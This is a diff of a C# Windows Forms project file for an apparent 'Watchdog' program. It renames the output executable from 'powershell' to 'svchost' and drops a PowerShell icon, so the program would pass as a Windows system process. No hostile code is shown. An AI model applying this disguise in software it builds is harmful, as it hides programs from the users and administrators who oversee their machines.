@@ -6,14 +6,9 @@
     <Nullable>enable</Nullable>
     <UseWindowsForms>true</UseWindowsForms>
     <ImplicitUsings>enable</ImplicitUsings>
-    <AssemblyName>powershell</AssemblyName>
+    <AssemblyName>svchost</AssemblyName>
     <StartupObject>Watchdog.Program</StartupObject>
 	<GenerateAssemblyInfo>false</GenerateAssemblyInfo>
 	<ApplicationManifest>app.manifest</ApplicationManifest>
-	<ApplicationIcon>PowerShell_5.0_icon.ico</ApplicationIcon>
   </PropertyGroup>
-
-  <ItemGroup>
-    <Content Include="PowerShell_5.0_icon.ico" />
-  </ItemGroup>
 </Project>
